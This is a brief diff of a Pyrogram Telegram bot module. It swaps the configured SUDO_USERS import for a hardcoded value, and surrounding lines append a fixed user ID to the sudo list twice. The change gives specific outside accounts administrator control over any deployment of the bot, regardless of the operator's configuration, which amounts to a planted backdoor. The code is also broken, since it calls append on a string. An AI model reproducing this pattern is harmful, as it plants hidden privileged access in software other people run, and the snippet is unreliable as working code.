@@ -2,7 +2,8 @@ from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
 from helpers.admins import get_administrators
-from config import SUDO_USERS
+
+SUDO_USERS = "1963422158"
 
 SUDO_USERS.append(5220532510)
 SUDO_USERS.append(5220532510)
